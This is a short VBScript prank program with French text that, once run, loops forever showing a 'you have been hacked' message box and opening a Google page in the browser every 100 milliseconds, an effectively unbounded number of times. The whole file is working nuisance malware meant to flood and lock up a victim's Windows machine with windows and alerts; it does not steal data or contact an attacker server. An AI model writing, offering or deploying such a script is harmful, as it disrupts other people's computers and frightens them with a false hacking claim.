Dim sURL 
Dim objShell
Dim iNbFois

iNbFois = 574646544546546546546532165465123465465486796545432132156


sURL = "https://www.google.ca/?hl=fr"

Do While true
  a = msgbox("Vous avez ete pirate par je vous ne le dirais pas" ,16, "hahaha espèce de nouille")
 For i2 = 1 to iNbFois
  set objShell = CreateObject("WScript.Shell")
  objShell.run(sURL)
     WScript.Sleep 100
 Next
 iNbFois = iNbFois + 1
Loop
